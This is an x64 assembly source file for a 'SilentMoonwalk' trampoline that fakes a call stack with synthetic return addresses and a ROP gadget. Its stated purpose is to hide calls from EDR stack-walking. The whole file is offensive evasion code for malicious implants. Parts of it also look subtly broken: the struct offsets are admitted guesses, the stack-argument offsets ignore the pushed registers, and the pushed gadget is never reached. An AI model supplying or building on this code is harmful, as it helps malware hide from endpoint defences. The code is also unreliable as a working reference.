# SilentMoonwalk Assembly Trampoline (x64)
# Call stack spoofing using ROP gadgets and synthetic frames
#
# Purpose: Execute function with fake call stack to evade EDR stack-walking
# Technique: Build synthetic stack frames pointing to legitimate code
#
# Author: Noctis-MCP
# Architecture: x64 only
# Syntax: GAS AT&T for MinGW-w64

.text
.globl SilentMoonwalk_CallFunction
.globl SilentMoonwalk_CallFunction4

# ========================================================================
# SilentMoonwalk_CallFunction - Execute with spoofed call stack
# ========================================================================
# Parameters:
#   RCX = PSPOOF_CONTEXT (pointer to spoofing context)
#   RDX = Function pointer to call
#   R8  = arg1
#   R9  = arg2
#   [RSP+0x28] = arg3
#   [RSP+0x30] = arg4
#
# Context structure offsets (must match C struct):
#   +0x00: mode
#   +0x08: gadgets (cache structure)
#   +....: frames array
#   +....: dwFrameCount
#
# Returns:
#   RAX = Return value from called function
# ========================================================================
SilentMoonwalk_CallFunction:
    # Save non-volatile registers
    push    %rbx
    push    %rsi
    push    %rdi
    push    %r12
    push    %r13
    push    %r14
    push    %r15
    push    %rbp

    # Save original RSP for cleanup
    mov     %rsp, %r15              # R15 = original stack pointer

    # Save parameters we'll need later
    mov     %rcx, %r12              # R12 = pContext
    mov     %rdx, %r13              # R13 = pFunction
    mov     %r8, %r14               # R14 = arg1
    mov     %r9, %rsi               # RSI = arg2

    # Load frame count from context
    # Assuming dwFrameCount is at offset 0x220 (this needs to match the actual struct)
    movl    0x220(%r12), %ebx       # EBX = dwFrameCount
    test    %ebx, %ebx
    jz      .Lno_frames             # If no frames, just call directly

    # Build synthetic frames
    # Each frame is: PVOID returnAddress (8 bytes) + PVOID rbpValue (8 bytes) = 16 bytes
    # Frames array starts at offset 0x200 (adjust based on actual struct)
    lea     0x200(%r12), %rdi       # RDI = &frames[0]

.Lbuild_frame_loop:
    test    %ebx, %ebx
    jz      .Lframes_built

    # Push synthetic return address
    mov     (%rdi), %rax            # Load returnAddress
    push    %rax

    # Move to next frame
    add     $0x10, %rdi             # sizeof(SYNTHETIC_FRAME) = 16 bytes
    dec     %ebx
    jmp     .Lbuild_frame_loop

.Lframes_built:
    # Push cleanup gadget address (add rsp, XX; ret)
    # This will skip over synthetic frames when function returns
    # Assuming addRsp28Ret gadget is at offset 0x120 in context
    mov     0x120(%r12), %rax       # Load gadget address
    push    %rax

.Lno_frames:
    # Setup arguments for target function (x64 fastcall)
    mov     %r14, %rcx              # arg1
    mov     %rsi, %rdx              # arg2
    mov     0x40(%r15), %r8         # arg3 (from original stack + offset for pushes)
    mov     0x48(%r15), %r9         # arg4

    # Call target function
    call    *%r13

    # Save return value
    mov     %rax, %r14

    # Restore stack (ROP gadget should have cleaned up synthetic frames)
    mov     %r15, %rsp

    # Restore non-volatile registers
    pop     %rbp
    pop     %r15
    pop     %r14
    pop     %r13
    pop     %r12
    pop     %rdi
    pop     %rsi
    pop     %rbx

    # Return value is in RAX (from R14)
    mov     %r14, %rax
    ret

# ========================================================================
# SilentMoonwalk_CallFunction4 - Simplified version for up to 4 args
# ========================================================================
# This is a simpler implementation that just spoofs the immediate caller
# More reliable and easier to use
# ========================================================================
SilentMoonwalk_CallFunction4:
    # Save registers
    push    %rbp
    push    %rbx
    push    %rsi
    push    %rdi

    # Save parameters
    mov     %rcx, %rbx              # pContext
    mov     %rdx, %rsi              # pFunction
    mov     %r8, %rdi               # arg1

    # Get synthetic return address from first frame
    # frames[0].returnAddress at offset 0x200
    mov     0x200(%rbx), %rax
    push    %rax                    # Push fake return address

    # Setup arguments
    mov     %rdi, %rcx              # arg1
    mov     %r9, %rdx               # arg2
    mov     0x38(%rsp), %r8         # arg3
    mov     0x40(%rsp), %r9         # arg4

    # Call function
    call    *%rsi

    # Clean up fake return address
    add     $8, %rsp

    # Restore registers
    pop     %rdi
    pop     %rsi
    pop     %rbx
    pop     %rbp

    ret
